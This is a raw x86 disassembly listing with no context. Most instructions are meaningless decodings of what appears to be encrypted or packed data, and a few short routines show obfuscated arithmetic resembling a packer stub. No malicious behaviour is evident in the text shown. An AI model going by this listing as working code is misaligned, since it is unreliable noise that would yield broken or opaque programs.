  405282:	add    DWORD PTR [edi],eax
  405284:	int    0x13
  405286:	or     dh,dh
  405288:	(bad)  
  405289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40528a:	inc    ecx
  40528b:	jmp    0x405234
  40528d:	or     bh,BYTE PTR [edi-0x569b6c79]
  405293:	daa    
  405294:	outs   dx,BYTE PTR ds:[esi]
  405295:	jnp    0x405278
  405297:	js     0x40524f
  405299:	sbb    DWORD PTR ds:[ecx+edx*4+0x72],esp
  40529e:	nop
  40529f:	xor    eax,0x106c13cb
  4052a4:	pop    ds
  4052a5:	and    edi,ebx
  4052a7:	pop    esi
  4052a8:	inc    eax
  4052a9:	sahf   
  4052aa:	mov    DWORD PTR [edx-0x58bd6cf1],ecx
  4052b0:	and    eax,0xdcdc2540
  4052b5:	sbb    DWORD PTR [ebx+0x50359899],0xffffffed
  4052bc:	(bad)  
  4052be:	xor    al,0x2c
  4052c0:	sub    eax,0x2f54eb0e
  4052c5:	cmp    ah,BYTE PTR [edx]
  4052c7:	jge    0x405276
  4052c9:	or     eax,0x29c40242
  4052ce:	xor    bl,0xba
  4052d1:	fsub   QWORD PTR [edi]
  4052d3:	mov    ds:0xb452a276,al
  4052d8:	arpl   WORD PTR [edi-0x18942aba],bx
  4052de:	hlt    
  4052df:	in     al,0x47
  4052e1:	cwde   
  4052e2:	cmp    esi,ecx
  4052e4:	sub    bh,BYTE PTR [eax-0x1d73f81]
  4052ea:	fcom   QWORD PTR [edi+ebx*8+0x7870dbe3]
  4052f1:	lahf   
  4052f2:	hlt    
  4052f3:	call   0x759f:0x431739d3
  4052fa:	fs stos BYTE PTR es:[edi],al
  4052fc:	xchg   esi,eax
  4052fd:	jp     0x40534b
  4052ff:	hlt    
  405300:	xchg   BYTE PTR [ebx+0x26a890d],al
  405306:	ficomp WORD PTR [edi]
  405308:	in     eax,dx
  405309:	jg     0x4052f8
  40530b:	add    al,0x6e
  40530d:	xchg   edi,eax
  40530e:	push   ebx
  40530f:	mov    ecx,0xd6f469a6
  405314:	mov    BYTE PTR [ebp+0x35b0e814],dh
  40531a:	mov    dl,dh
  40531c:	ffreep st(4)
  40531e:	push   cs
  40531f:	mov    ah,0x60
  405321:	sub    eax,0xa27f33c0
  405326:	or     cl,BYTE PTR [edx+0x45]
  405329:	jbe    0x405342
  40532b:	dec    edi
  40532c:	sub    al,0x75
  40532e:	or     DWORD PTR [eax],esp
  405330:	add    al,0xdc
  405332:	popf   
  405333:	inc    ebp
  405334:	lahf   
  405335:	int3   
  405336:	push   esi
  405337:	xlat   BYTE PTR ds:[ebx]
  405338:	or     DWORD PTR [esi+eax*2],eax
  40533b:	fadd   QWORD PTR ds:0xfc895cbb
  405341:	out    0x7,eax
  405343:	mov    ah,0xed
  405345:	in     eax,dx
  405346:	pop    ecx
  405347:	popa   
  405348:	or     DWORD PTR [edx+0x1b3b3e83],0xa6f81c8b
  405352:	loop   0x40537d
  405354:	pop    esi
  405355:	dec    ecx
  405356:	int    0x69
  405358:	clc    
  405359:	sbb    dl,al
  40535b:	sub    eax,DWORD PTR [ebp+0x17]
  40535e:	in     al,dx
  40535f:	push   ds
  405360:	or     al,0x13
  405362:	ja     0x405317
  405364:	mov    ds:0xb363a79f,al
  405369:	xchg   esi,eax
  40536a:	popf   
  40536b:	retf   
  40536c:	and    BYTE PTR [ebx],dl
  40536e:	fstp   TBYTE PTR [ebx+ebx*2+0x6f]
  405372:	adc    edx,DWORD PTR cs:[edx-0x7a]
  405376:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405377:	mov    bh,ah
  405379:	bound  eax,QWORD PTR ds:0xf9dfc74b
  40537f:	das    
  405380:	and    BYTE PTR [edi+0x49355fc3],cl
  405386:	loope  0x4053c6
  405388:	addr16 in al,0x4
  40538b:	mov    esi,0xbf59af8c
  405390:	aad    0x13
  405392:	retf   0xf03f
  405395:	cmc    
  405396:	nop
  405397:	jmp    0x405348
  405399:	sub    edi,DWORD PTR [esi]
  40539b:	(bad)  
  40539c:	xchg   esp,eax
  40539d:	imul   esi,DWORD PTR [edx+0x15fa2dcb],0xffffff8a
  4053a4:	stos   BYTE PTR es:[edi],al
  4053a5:	push   cs
  4053a6:	inc    edx
  4053a7:	in     eax,dx
  4053a8:	rcr    BYTE PTR [edi-0x56],1
  4053ab:	fisubr DWORD PTR [edi+0x3b]
  4053ae:	(bad)  
  4053af:	pop    eax
  4053b0:	lea    edi,[ebx+0x32]
  4053b3:	dec    eax
  4053b4:	pop    es
  4053b5:	push   ebp
  4053b6:	lods   al,BYTE PTR ds:[esi]
  4053b7:	adc    eax,0xd7a9fdc9
  4053bc:	jno    0x40535b
  4053be:	jmpw   0xb5cb
  4053c2:	lods   eax,DWORD PTR ds:[esi]
  4053c3:	clc    
  4053c4:	push   esi
  4053c5:	pop    es
  4053c6:	pop    edi
  4053c7:	cmp    BYTE PTR [eax+ecx*2],bh
  4053ca:	xchg   ecx,eax
  4053cb:	adc    eax,0x4986c6f
  4053d0:	add    al,0x34
  4053d2:	add    al,0x1c
  4053d4:	or     DWORD PTR [ebx],edi
  4053d6:	adc    DWORD PTR [edx+0x2c],ebx
  4053d9:	fwait
  4053da:	sbb    eax,0xa4197eb5
  4053df:	imul   BYTE PTR [esi-0x3d2b4b57]
  4053e5:	cmp    eax,0x2c1f68ca
  4053ea:	aas    
  4053eb:	dec    BYTE PTR [eax+0x6044aade]
  4053f1:	or     DWORD PTR [edx+0x33d2c1ad],ebp
  4053f7:	dec    esp
  4053f8:	div    BYTE PTR cs:[eax]
  4053fb:	(bad)  
  4053fc:	mov    dl,0xd4
  4053fe:	enter  0x135d,0x87
  405402:	push   0xffffffaa
  405404:	das    
  405405:	adc    al,0xe6
  405407:	into   
  405408:	dec    edi
  405409:	inc    ebp
  40540a:	call   0xb70a:0xca421138
  405411:	loopne 0x4053db
  405413:	add    dl,BYTE PTR [edx-0x1e8a167f]
  405419:	push   esi
  40541a:	(bad)  
  40541c:	jnp    0x40540c
  40541e:	jns    0x405481
  405420:	add    eax,0xbf775197
  405425:	mov    ecx,0x3a0a946a
  40542a:	push   esp
  40542b:	loope  0x40549e
  40542d:	mov    eax,ds:0x1268b421
  405432:	shl    BYTE PTR [esi+0x28],0x56
  405436:	dec    edi
  405437:	lods   eax,DWORD PTR ds:[esi]
  405438:	mov    esi,0xf769349
  40543d:	and    DWORD PTR ds:0x67090bf7,eax
  405443:	mov    BYTE PTR [eax-0x36],ah
  405446:	fstp   QWORD PTR [edx]
  405448:	pop    edi
  405449:	in     eax,0x8e
  40544b:	adc    BYTE PTR [ecx-0x4d48d243],0x3e
  405452:	stc    
  405453:	sub    dl,BYTE PTR [esi]
  405455:	mov    al,ds:0xdc50dc5
  40545a:	dec    ebx
  40545b:	sub    BYTE PTR [edx-0x35],bl
  40545e:	push   ds
  40545f:	or     eax,0x3bbaaebd
  405464:	cli    
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi-0x1dda0448]
  405484:	push   edi
  405485:	mov    esi,0x7e7e2bd0
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x40544e
  40548f:	adc    eax,0x8bf30c49
  405494:	in     eax,0xdd
  405496:	mov    bl,0x69
  405498:	les    edx,FWORD PTR [ebp-0x2c037de6]
  40549e:	adc    ebp,DWORD PTR [ebp-0x2d3cb57b]
  4054a4:	mov    ebx,0x92269a09
  4054a9:	mov    eax,ds:0xa4b1c989
  4054ae:	mov    ds:0x866db85b,eax
  4054b3:	std    
  4054b4:	pop    ebp
  4054b5:	xor    ah,bl
  4054b7:	lods   eax,DWORD PTR ds:[esi]
  4054b8:	call   0x1b4a:0x8edc2bc6
  4054bf:	or     DWORD PTR ds:0x148fab86,esi
  4054c5:	fwait
  4054c6:	add    ch,BYTE PTR [ebx-0x7a]
  4054c9:	push   ebx
  4054ca:	xor    esi,DWORD PTR [edx+0x24cb57e1]
  4054d0:	xchg   esp,eax
  4054d1:	cdq    
  4054d2:	(bad)  
  4054d3:	aaa    
  4054d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054d5:	int3   
  4054d6:	cmp    al,BYTE PTR [esi]
  4054d8:	(bad)  
  4054d9:	cmp    al,0x6a
  4054db:	sbb    al,0xa3
  4054dd:	adc    DWORD PTR [ebp-0x46],ecx
  4054e0:	mov    eax,0xc8d30738
  4054e5:	aas    
  4054e6:	jmp    0xd7b8595
  4054eb:	lods   al,BYTE PTR ds:[esi]
  4054ec:	mov    esp,0xfbd2ef06
  4054f1:	xlat   BYTE PTR ds:[ebx]
  4054f2:	lea    esp,ds:0x5be0cdf4
  4054f8:	xor    BYTE PTR [eax],dh
  4054fa:	mov    ss,WORD PTR [edx+0x1214acca]
  405500:	cmp    bh,BYTE PTR [eax+0x74bd15bc]
  405506:	adc    DWORD PTR [eax+0x69768747],ebp
  40550c:	fdiv   DWORD PTR [ecx+0x42]
  40550f:	xchg   ebp,eax
  405510:	ds inc ebp
  405512:	clc    
  405513:	jb     0x40553c
  405515:	mov    BYTE PTR [esi+0x29],al
  405518:	call   0x84b4:0xd3cd53ba
  40551f:	xchg   edi,eax
  405520:	aas    
  405521:	aad    0xfc
  405523:	mov    ds:0xcb553f12,al
  405528:	shl    DWORD PTR [esi],cl
  40552a:	repz add al,0x53
  40552d:	ins    BYTE PTR es:[edi],dx
  40552e:	inc    edx
  40552f:	je     0x40557b
  405531:	mov    ds:0xd03bf91b,al
  405536:	fnsave [ebx]
  405538:	pop    edx
  405539:	cmp    al,0xbe
  40553b:	(bad)  
  40553c:	mov    edx,0xb0c76f0c
  405541:	mov    bl,0xdd
  405543:	push   esp
  405544:	sbb    eax,0x73aaca78
  405549:	mov    eax,ds:0x5cd9e402
  40554e:	pop    edx
  40554f:	sti    
  405550:	fs or  edx,edi
  405553:	add    al,0x5b
  405555:	sub    ebx,ebp
  405557:	jp     0x6826dc29
  40555d:	jmp    0x398d9188
  405562:	adc    DWORD PTR [ebx+eax*8+0x32],edx
  405566:	dec    ebp
  405567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405568:	xchg   edi,eax
  405569:	fwait
  40556a:	test   eax,0x17fc851
  40556f:	inc    ebp
  405570:	(bad)  [edi-0x7f]
  405573:	fcom   DWORD PTR [esi]
  405575:	or     al,0xb
  405577:	or     BYTE PTR [ebx-0x39cffb71],0x9e
  40557e:	fdivr  DWORD PTR [ebp+0x3b]
  405581:	inc    ecx
  405582:	inc    eax
  405583:	stos   DWORD PTR es:[edi],eax
  405584:	xchg   esi,eax
  405585:	inc    eax
  405586:	repnz test BYTE PTR [edx],dh
  405589:	xchg   esi,eax
  40558a:	rcr    DWORD PTR [ebx],0x36
  40558d:	mov    ebp,0x380287d
  405592:	or     bl,bh
  405594:	pop    ds
  405595:	mov    esp,0xb6fdcc86
  40559a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40559b:	push   ss
  40559c:	mov    al,ds:0x3a2f9dd3
  4055a1:	xchg   ebp,eax
  4055a2:	test   BYTE PTR [ecx],bl
  4055a4:	sub    BYTE PTR [edx+edx*2],dh
  4055a7:	rcr    DWORD PTR [eax+0x1abca930],1
  4055ad:	loope  0x405569
  4055af:	jb     0x4055c4
  4055b1:	jae    0x4055d6
  4055b3:	add    ecx,ecx
  4055b5:	jmp    0x4055fd
  4055b7:	fisub  DWORD PTR [edi+ebp*2-0x55367eb4]
  4055be:	push   ebp
  4055bf:	add    ecx,DWORD PTR [edi]
  4055c1:	imul   edx,DWORD PTR [ecx+ecx*2+0x4dc9092a],0xffffffeb
  4055c9:	jmp    0x4055aa
  4055cb:	inc    edi
  4055cc:	fwait
  4055cd:	stos   DWORD PTR es:[edi],eax
  4055ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055cf:	out    dx,eax
  4055d0:	sub    eax,0xfc23acf3
  4055d5:	sahf   
  4055d6:	adc    eax,0x58e9ca72
  4055db:	sbb    eax,0xb9873fcd
  4055e0:	pop    ss
  4055e1:	pop    ebp
  4055e2:	mov    al,0x6e
  4055e4:	add    ebp,DWORD PTR [eax+0x309bff49]
  4055ea:	jge    0x40564e
  4055ec:	in     eax,0x81
  4055ee:	jle    0x405631
  4055f0:	test   al,0xe8
  4055f2:	jge    0x405624
  4055f4:	add    al,0x3a
  4055f6:	sbb    ebp,ebx
  4055f8:	cmc    
  4055f9:	mov    ds,esp
  4055fb:	and    eax,0x59473a36
  405600:	ret    0xb572
  405603:	push   edi
  405604:	js     0x40561b
  405606:	(bad)  
  405607:	mov    esp,0xa4252ea9
  40560c:	stos   DWORD PTR es:[edi],eax
  40560d:	imul   ebp,DWORD PTR [ebp-0x69773728],0x3e
  405614:	mov    WORD PTR [ebp+0x42],cs
  405617:	std    
  405618:	sti    
  405619:	lea    ebx,[ebp+0x1617407f]
  40561f:	aaa    
  405620:	jl     0x4055c7
  405622:	jmp    0xc7f2:0xcb2ab0df
  405629:	cdq    
  40562a:	jge    0x405651
  40562c:	push   0xffffff94
  40562e:	dec    esi
  40562f:	lods   al,BYTE PTR ds:[esi]
  405630:	leave  
  405631:	mov    ?,ebp
  405633:	pop    edx
  405634:	fidivr WORD PTR [eax-0x70d51f8c]
  40563a:	push   ss
  40563b:	retf   
  40563c:	push   edx
  40563d:	pop    edi
  40563e:	mov    ebx,0x4d4b0750
  405643:	jb     0x4056a1
  405645:	out    0x3e,eax
  405647:	test   eax,0x488b852a
  40564d:	out    dx,eax
  40564e:	xchg   edx,eax
  40564f:	outs   dx,DWORD PTR ds:[esi]
  405650:	call   0x667:0xcbf2e473
  405657:	add    DWORD PTR [edx-0x5e],edx
  40565a:	sub    eax,0xca87c338
  40565f:	addr16 push ebp
  405661:	dec    esp
  405662:	neg    DWORD PTR [eax+0x19b74652]
  405668:	mov    ch,0xcc
  40566a:	pop    ds
  40566b:	std    
  40566c:	xchg   edx,eax
  40566d:	or     bh,BYTE PTR [edx-0x42]
  405670:	rol    BYTE PTR [edx],cl
  405672:	mov    al,ds:0xec0f6f79
  405677:	imul   BYTE PTR [ebx+ebx*1]
  40567a:	xor    bl,ch
  40567c:	mov    ds:0x1b36afe3,eax
  405681:	rcl    BYTE PTR [esi+0x59a5ec8c],1
  405687:	shr    DWORD PTR [edx-0x1fffbe3b],cl
  40568d:	gs (bad) 
  40568f:	fdivr  DWORD PTR [ebx]
  405691:	or     al,0x56
  405693:	mov    edi,0xe65ab856
  405698:	adc    cl,BYTE PTR [edi+0x2b55523a]
  40569e:	pop    esp
  40569f:	in     al,dx
  4056a0:	sbb    cl,BYTE PTR [ebp-0x67529f64]
  4056a6:	or     ebp,DWORD PTR [ebx+eiz*8+0x4e6f7c35]
  4056ad:	out    0x8f,eax
  4056af:	jmp    0x4056e4
  4056b1:	ins    BYTE PTR es:[edi],dx
  4056b2:	mov    cl,0x26
  4056b4:	in     eax,0x95
  4056b6:	add    esp,DWORD PTR [eax]
  4056b8:	(bad)  
  4056b9:	clc    
  4056ba:	inc    esp
  4056bb:	sub    edx,DWORD PTR ds:0x81fbadda
  4056c1:	std    
  4056c2:	sbb    eax,0xf5873b19
  4056c7:	lods   al,BYTE PTR ds:[esi]
  4056c8:	pop    esi
  4056c9:	mov    esi,0xe05fcb04
  4056ce:	sbb    DWORD PTR [ebx+0x5b4b92ee],esp
  4056d4:	mov    cl,BYTE PTR [eax+ebp*2-0x3]
  4056d8:	idiv   ch
  4056da:	jnp    0x405735
  4056dc:	or     ecx,DWORD PTR [esi-0x7a]
  4056df:	(bad)  
  4056e0:	jmp    0x275:0x6d0b1016
  4056e7:	test   al,0xed
  4056e9:	push   esi
  4056ea:	in     eax,dx
  4056eb:	cs cmp eax,0x2a8f5e10
  4056f1:	push   ds
  4056f2:	jp     0x4056cf
  4056f4:	dec    ecx
  4056f5:	add    al,0x5
  4056f7:	pop    es
  4056f8:	mov    ch,0xee
  4056fa:	xchg   ebx,eax
  4056fb:	mov    DWORD PTR [esi+0x2f],ecx
  4056fe:	mov    edi,DWORD PTR [ecx+0x3af66818]
  405704:	es loope 0x405782
  405707:	aaa    
  405708:	pusha  
  405709:	fwait
  40570a:	cmp    ah,0x8a
  40570d:	pinsrw mm5,WORD PTR [edi],0xd7
  405711:	ret    0x6ccc
  405714:	retf   0x6af3
  405717:	outs   dx,BYTE PTR ds:[esi]
  405718:	push   ds
  405719:	sbb    eax,0xe8dfe077
  40571e:	test   eax,0xf9448993
  405723:	pushf  
  405724:	sbb    BYTE PTR [ebp-0x26cc9f88],bh
  40572a:	sahf   
  40572b:	xchg   esi,eax
  40572c:	outs   dx,DWORD PTR ds:[esi]
  40572d:	and    BYTE PTR [eax-0x61],dh
  405730:	pop    esi
  405731:	mov    ds:0xfbe7a90f,eax
  405736:	pop    ebx
  405737:	das    
  405738:	(bad)  
  405739:	lds    esi,FWORD PTR [esi]
  40573b:	ret    0xac04
  40573e:	ins    BYTE PTR es:[edi],dx
  40573f:	pop    es
  405740:	mov    eax,ds:0xfe591f55
  405745:	or     eax,0xa963ba4c
  40574a:	stc    
  40574b:	xor    BYTE PTR [eax],dh
  40574d:	test   al,0xc1
  40574f:	lods   eax,DWORD PTR ds:[esi]
  405750:	dec    ebp
  405751:	test   DWORD PTR [ecx+0x3d4a0ca9],ebx
  405757:	mov    esp,0x7c4f8af0
  40575c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40575d:	dec    esi
  40575e:	adc    BYTE PTR [esi],dh
  405760:	push   ecx
  405761:	xor    ebx,DWORD PTR [ecx-0x635d641a]
  405767:	cmp    BYTE PTR [edx+0x18],al
  40576a:	cs pop ebx
  40576c:	(bad)  
  40576d:	cmp    eax,0x4551b597
  405772:	repz scas eax,DWORD PTR es:[edi]
  405774:	xor    edx,eax
  405776:	add    edx,ecx
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43389b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x4337a3,0x433783
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x4337df
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x52
  4057f5:	ins    BYTE PTR es:[edi],dx
  4057f6:	ret    
  4057f7:	sar    DWORD PTR [edx],cl
  4057f9:	ss jle 0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	rol    DWORD PTR [ecx-0x2299e880],cl
  405806:	xor    ah,BYTE PTR [esi+0x44]
  405809:	cmp    BYTE PTR [edi+eiz*8],bh
  40580c:	cld    
  40580d:	adc    al,0xc4
  40580f:	sbb    eax,0xfb78388c
  405814:	mov    ds:0x70cc59c6,eax
  405819:	inc    edi
  40581a:	and    ebx,ebp
  40581c:	leave  
  40581d:	xlat   BYTE PTR ds:[ebx]
  40581e:	xchg   ebp,eax
  40581f:	out    dx,eax
  405820:	cld    
  405821:	add    al,0x1c
  405823:	xlat   BYTE PTR ds:[ebx]
  405824:	pop    ss
  405825:	or     DWORD PTR [esi+0x64],esp
  405828:	push   edi
  405829:	add    ebp,DWORD PTR [esi]
  40582b:	add    al,0x91
  40582d:	and    ecx,DWORD PTR [edi]
  40582f:	add    ecx,DWORD PTR [eax]
  405831:	gs add al,0xa
  405834:	mov    cl,0x4b
  405836:	jne    0x405808
  405838:	dec    ecx
  405839:	inc    esi
  40583a:	inc    edx
  40583b:	jne    0x405898
  40583d:	mov    eax,0xca7f61a5
  405842:	or     edi,DWORD PTR [ebx+0x2f]
  405845:	imul   esp,DWORD PTR [edi+0x2a2b4512],0x4b
  40584c:	(bad)  
  40584d:	in     eax,0xe4
  40584f:	jmp    0x40589b
  405851:	jne    0x40584a
  405853:	dec    eax
  405854:	mov    ah,0x2a
  405856:	scas   al,BYTE PTR es:[edi]
  405857:	pop    ds
  405858:	ror    DWORD PTR [ebx],1
  40585a:	mov    al,bl
  40585c:	push   es
  40585d:	and    ebp,DWORD PTR [ebx+0x55]
  405860:	or     ah,BYTE PTR [ecx+0x75d41644]
  405866:	mov    bl,0xbc
  405868:	and    al,BYTE PTR [edi]
  40586a:	sub    al,0x4
  40586c:	mov    ebx,0x61ecc0a2
  405871:	arpl   ax,ax
  405873:	lock sub cl,BYTE PTR [edi+0x21]
  405877:	add    eax,0x3d5c6268
  40587c:	push   esi
  40587d:	adc    DWORD PTR [ebp+0x52],edi
  405880:	and    eax,0xcc07248c
  405885:	mov    al,BYTE PTR [edx+0x169b88ee]
  40588b:	xlat   BYTE PTR ds:[ebx]
  40588c:	xor    edi,ecx
  40588e:	sub    edi,0xaf343507
  405894:	mov    esp,0x8087fcdd
  405899:	or     BYTE PTR [edi+0x25],cl
  40589c:	sahf   
  40589d:	jne    0x405822
  40589f:	iret   
  4058a0:	push   edi
  4058a1:	gs pop ebx
  4058a3:	and    eax,0xd39454b4
  4058a8:	(bad)  
  4058a9:	xchg   ecx,eax
  4058aa:	sbb    eax,0x7c94f43a
  4058af:	loopne 0x4058e7
  4058b1:	mov    ds:0xe03d11d5,al
  4058b6:	das    
  4058b7:	dec    edi
  4058b8:	cmp    BYTE PTR [esi-0x18991d03],ch
  4058be:	inc    eax
  4058bf:	and    BYTE PTR [ecx+0xf],al
  4058c2:	test   DWORD PTR [esi+0xf027c12],ecx
  4058c8:	ins    BYTE PTR es:[edi],dx
  4058c9:	inc    edx
  4058ca:	push   edx
  4058cb:	push   ebp
  4058cc:	dec    esi
  4058cd:	mov    ch,0xab
  4058cf:	arpl   di,bx
  4058d1:	gs inc bp
  4058d4:	sti    
  4058d5:	cmp    al,0xde
  4058d7:	push   ds
  4058d8:	inc    eax
  4058d9:	mov    edx,0xc3b9bc6
  4058de:	leave  
  4058df:	xor    DWORD PTR [ecx+0x38],esp
  4058e2:	sub    DWORD PTR [eax-0x7a1f74e8],ecx
  4058e8:	sub    eax,0x54358215
  4058ed:	mov    bh,BYTE PTR [ecx-0x5a]
  4058f0:	inc    ebx
  4058f1:	mov    edx,DWORD PTR [esi+esi*1]
  4058f4:	fs mov ch,0x7f
  4058f7:	inc    BYTE PTR [esp+edx*8+0x1b96c886]
  4058fe:	pop    edi
  4058ff:	add    BYTE PTR [ecx+ebp*1+0x4a4c241b],al
  405906:	scas   eax,DWORD PTR es:[edi]
  405907:	mov    dh,0x7a
  405909:	xlat   BYTE PTR ds:[ebx]
  40590a:	out    dx,al
  40590b:	push   ebx
  40590c:	sub    al,0xe2
  40590e:	jno    0x405966
  405910:	and    eax,0x70a9a5c3
  405915:	xor    eax,DWORD PTR [edx-0x9]
  405918:	jb     0x4058a4
  40591a:	and    al,0x69
  40591c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40591d:	jl     0x40590d
  40591f:	test   BYTE PTR [ebx-0x4a],bh
  405922:	aam    0xbe
  405924:	mov    esi,0x696f5892
  405929:	std    
  40592a:	enter  0xf121,0xc8
  40592e:	dec    ebx
  40592f:	into   
  405930:	popa   
  405931:	add    DWORD PTR [edx],edx
  405933:	mov    WORD PTR [edi+0x3],fs
  405936:	imul   ebx,DWORD PTR [ebp+0x4b],0xb5c3818
  40593d:	mov    ecx,0x169b6916
  405942:	add    BYTE PTR [ebp-0x3a],0xad
  405946:	or     eax,0x3fc48f4f
  40594b:	sbb    eax,DWORD PTR [esi-0x12]
  40594e:	lds    edi,FWORD PTR [ecx]
  405950:	scas   eax,DWORD PTR es:[edi]
  405951:	int3   
  405952:	aad    0xaf
  405954:	mov    eax,ds:0xc11f65f6
  405959:	push   edi
  40595a:	jo     0x405991
  40595c:	dec    edx
  40595d:	sbb    ch,dh
  40595f:	lea    esp,[edx+0x3a]
  405962:	lds    edx,FWORD PTR [ebp+0x4e]
  405965:	mov    edi,0xd21c6b99
  40596a:	(bad)  
  40596b:	dec    edx
  40596c:	jbe    0x405919
  40596e:	leave  
  40596f:	and    ecx,DWORD PTR [edi+0x3c624bde]
  405975:	xor    eax,0x9c53ff0c
  40597a:	sbb    DWORD PTR [edx+0x1500b17e],esi
  405980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405981:	jns    0x4059b6
  405983:	pop    ebp
  405984:	mov    eax,ds:0x56d92716
  405989:	mov    ch,0x9a
  40598b:	jecxz  0x40596f
  40598d:	jnp    0x405a06
  40598f:	mov    ebp,0x23617fb6
  405994:	imul   edi,DWORD PTR [esi],0xdcf11bf8
  40599a:	out    dx,eax
  40599b:	sbb    edi,DWORD PTR [edx+eax*4-0x55]
  40599f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059a0:	or     al,0xce
  4059a2:	lea    edi,[esi+0x5b]
  4059a5:	push   ss
  4059a6:	cmp    BYTE PTR [eax-0xa],ch
  4059a9:	sahf   
  4059aa:	sub    al,0xed
  4059ac:	and    ah,bh
  4059ae:	mov    al,BYTE PTR [ebp+0x23]
  4059b1:	add    esi,esp
  4059b3:	cmp    eax,0xa099fb33
  4059b8:	jns    0x40596e
  4059ba:	in     eax,0x33
  4059bc:	mov    ebx,0x12569883
  4059c1:	and    eax,0xf9a37baf
  4059c6:	mov    al,0xf6
  4059c8:	frstor [edi-0x7dd0f051]
  4059ce:	nop
  4059cf:	sub    ecx,DWORD PTR [ebx+eiz*2-0x30993669]
  4059d6:	outs   dx,BYTE PTR ds:[esi]
  4059d7:	fcom   QWORD PTR [esi+0x2f]
  4059da:	push   esi
  4059db:	mov    bh,0x3a
  4059dd:	push   ds
  4059de:	popf   
  4059df:	jnp    0x405a3f
  4059e1:	aaa    
  4059e2:	pop    ss
  4059e3:	sti    
  4059e4:	xor    DWORD PTR [ebp+edi*1-0x517b9d3c],esi
  4059eb:	retf   0xe7e7
  4059ee:	jg     0x405972
  4059f0:	or     BYTE PTR [ebx+ecx*2],al
  4059f3:	xchg   esp,eax
  4059f4:	dec    ebx
  4059f5:	mov    esi,DWORD PTR [ecx+0x4d]
  4059f8:	cmp    al,0xa3
  4059fa:	rol    BYTE PTR [ecx],cl
  4059fc:	outs   dx,BYTE PTR ds:[esi]
  4059fd:	and    al,0x47
  4059ff:	add    DWORD PTR [eax-0x39],esi
  405a02:	pop    ds
  405a03:	mov    dl,0x77
  405a05:	sub    ebx,ecx
  405a07:	daa    
  405a08:	cmp    eax,0xe7de589b
  405a0d:	xor    DWORD PTR [eax],ecx
  405a0f:	and    eax,0x51f77f7d
  405a14:	in     eax,dx
  405a15:	sbb    al,BYTE PTR [ebx+esi*2]
  405a18:	repz and esi,ebx
  405a1b:	or     BYTE PTR [edi-0x6b3fedcb],al
  405a21:	xlat   BYTE PTR ds:[ebx]
  405a22:	ret    0xd026
  405a25:	jmp    0x1c57:0x6209e5e
  405a2c:	gs jl  0x4059d3
  405a2f:	mov    bl,0x8
  405a31:	ss add ebx,0x8
  405a35:	pop    ds
  405a36:	xor    DWORD PTR [ebx],0x76
  405a39:	xchg   esi,eax
  405a3a:	sub    ah,dl
  405a3c:	in     eax,0xab
  405a3e:	(bad)  
  405a3f:	loope  0x405a8f
  405a41:	pop    edi
  405a42:	jbe    0x405a0b
  405a44:	fs repnz dec edi
  405a47:	retf   0x73c0
  405a4a:	inc    ebx
  405a4b:	xor    DWORD PTR [esi],esi
  405a4d:	mov    al,ah
  405a4f:	inc    ecx
  405a50:	xor    DWORD PTR [edi-0x28],esp
  405a53:	jne    0x405a6b
  405a55:	fild   WORD PTR [esp+ebx*2+0x5f4babbf]
  405a5c:	mov    ecx,0x78ee48c8
  405a61:	cmp    BYTE PTR [eax],bh
  405a63:	daa    
  405a64:	retf   
  405a65:	(bad)  
  405a66:	arpl   WORD PTR [ecx],di
  405a68:	addr16 hlt 
  405a6a:	sti    
  405a6b:	dec    ebx
  405a6c:	pushf  
  405a6d:	in     al,dx
  405a6e:	leave  
  405a6f:	add    eax,0xe203b33c
  405a74:	mov    ch,0xe3
  405a76:	and    eax,DWORD PTR [esi+0x2bde28b0]
  405a7c:	arpl   bx,dx
  405a7e:	outs   dx,BYTE PTR ds:[esi]
  405a7f:	enter  0x238e,0xa8
  405a83:	mul    ecx
  405a85:	or     eax,0x9f51e9bc
  405a8a:	cs ins DWORD PTR es:[edi],dx
